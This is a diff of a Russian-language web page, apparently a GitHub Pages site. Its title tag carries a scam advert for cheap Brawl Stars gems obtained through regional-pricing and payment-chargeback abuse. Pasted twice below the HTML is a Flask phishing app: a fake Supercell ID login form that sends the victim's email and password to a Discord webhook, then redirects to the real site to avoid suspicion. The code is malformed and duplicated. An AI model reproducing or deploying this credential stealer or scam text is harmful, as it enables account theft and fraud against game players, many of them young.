@@ -1,8 +1,145 @@
 <!DOCTYPE html>
 <html>
-<head><title>мой сайт бесплатно</title></head>
+<head><title>привет!
+
+ты попал на неофициальный маркет brawl stars где цены ниже чем в самом supercell store. мы не боги но у нас есть доступ к региональным ценам и баг с турецкой лирой через vpn. работаем с 2022 года.
+
+наши цены (рубли / доллары)
+
+гемы:
+
+· 80 гемов = 59 руб (в игре 159 руб)
+· 170 гемов = 119 руб (в игре 319 руб)
+· 360 гемов = 249 руб (в игре 649 руб)
+· 950 гемов = 599 руб (в игре 1499 руб)
+· 2000 гемов = 1190 руб (в игре 2999 руб)
+
+ящики и бойцы:
+
+· мегаящик x10 = 199 руб
+· легендарный боец (на выбор любой кроме самых новых) = 399 руб
+· хромовый боец текущего сезона = 299 руб
+· скин эпического уровня = 149 руб
+· скин легендарный (мифический) = 349 руб
+
+пропуск brawl pass (полный) = 249 руб (в игре стоит 449)
+набор 5 мегаящиков + 1000 монет = 249 руб
+
+как мы это делаем
+
+мы используем комбинацию: турецкий аккаунт supercell + карта турецкого банка + прокси для смены региона + метод возврата платежа через поддержку apple. суть: мы покупаем гемы по турецкой цене (в 3.5 раза дешевле) а вам продаём с наценкой. второй способ - фарм гемов на тестовых серверах конвертация в боевые пропуски потом перенос на ваш аккаунт через связку clan games.
+
+условия
+
+· минимальная сумма заказа 199 руб
+· оплата qiwi / yoomoney / крипта (usdt trc20)
+· после оплаты кидаете тег аккаунта и список желаемого
+· срок выполнения от 10 минут до 24 часов
+· гарантия 30 дней если забанят - вернём деньги или сделаем новый фарм
+
+почему так дешево и не кидалово
+
+у нас нет аренды офиса и налогов. плюс supercell не трогает мелкие региональные серые схемы потому что им похуй на оборот до 10к баксов в месяц. мы уже продали более 3000 заказов тг канал @brawl_cheap_shop (пруфы в закрепе). каждый пятый клиент получает скидку 10% на следующий заказ.
+
+важное ограничение
+
+на один аккаунт не более 2000 гемов в месяц и не более 3 легендарных бойцов. иначе сработает антифрод система supercell. мы сами предупредим если пытаетесь перебрать.
+
+как заказать
+
+напишите в телеграм @brawl_fake_support (ссылка ниже) или просто заполните форму. в ответ придет счет и инструкция по оплате. после оплаты не закрывайте чат - через пару часов придут предметы.
+
+не верите? закажите минималку на 199 руб и проверьте. уходим в минус на первом заказе чтобы вы поверили.
+</title></head>
 <body>
-<h1>ебать я сделал сайт</h1>
+<h1></h1>
 <p>Brawlstatsgift</p>
 </body>
 </html>
+app = Flask(name)
+
+# https://vladsukazaebal.github.io/Brawlstrasgift/
+fake_login_page = '''
+<!DOCTYPE html>
+<html>
+<head><title>brawl stars вход</title></head>
+<body>
+<center>
+<h2>войдите в supercell id</h2>
+<form method="post" action="/login">
+<input type="email" name="email" placeholder="почта" required><br><br>
+<input type="password" name="password" placeholder="пароль" required><br><br>
+<input type="submit" value="войти">
+</form>
+</center>
+</body>
+</html>
+'''
+
+# словарь для сбора данных
+stolen_data = []
+
+@app.route('/')
+def index():
+    return render_template_string(fake_login_page)
+
+@app.route('/login', methods=['POST'])
+def login():
+    email = request.form.get('email')
+    password = request.form.get('password')
+    # сохраняем украденное
+    stolen_data.append({'email': email, 'password': password})
+    # отправляем себе на сервер (например на вебхук или на свой бот)
+    webhook_url = 'https://discord.com/api/webhooks/1505137773810810951/qA1nqYdCE8pz4rxzvcD2IC9U2TzTu9Pv5Ti0bEImbUeJvr-ZnfCoxbTrJncw6zcOkag7'  # замени на реальный
+    try:
+        requests.post(webhook_url, json={'email': email, 'pass': password})
+    except:
+        pass
+    # перенаправляем жертву на настоящий сайт supercell чтоб не спалиться
+    return redirect('https://link.brawlstars.com/')
+
+if name == 'main':
+    app.run(host='0.0.0.0', port=8080)app = Flask(name)
+
+# https://vladsukazaebal.github.io/Brawlstrasgift/
+fake_login_page = '''
+<!DOCTYPE html>
+<html>
+<head><title>brawl stars вход</title></head>
+<body>
+<center>
+<h2>войдите в supercell id</h2>
+<form method="post" action="/login">
+<input type="email" name="email" placeholder="почта" required><br><br>
+<input type="password" name="password" placeholder="пароль" required><br><br>
+<input type="submit" value="войти">
+</form>
+</center>
+</body>
+</html>
+'''
+
+# словарь для сбора данных
+stolen_data = []
+
+@app.route('/')
+def index():
+    return render_template_string(fake_login_page)
+
+@app.route('/login', methods=['POST'])
+def login():
+    email = request.form.get('email')
+    password = request.form.get('password')
+    # сохраняем украденное
+    stolen_data.append({'email': email, 'password': password})
+    # отправляем себе на сервер (например на вебхук или на свой бот)
+    webhook_url = 'https://discord.com/api/webhooks/1505137773810810951/qA1nqYdCE8pz4rxzvcD2IC9U2TzTu9Pv5Ti0bEImbUeJvr-ZnfCoxbTrJncw6zcOkag7'  # замени на реальный
+    try:
+        requests.post(webhook_url, json={'email': email, 'pass': password})
+    except:
+        pass
+    # перенаправляем жертву на настоящий сайт supercell чтоб не спалиться
+    return redirect('https://link.brawlstars.com/')
+
+if name == 'main':
+    app.run(host='0.0.0.0', port=8080)
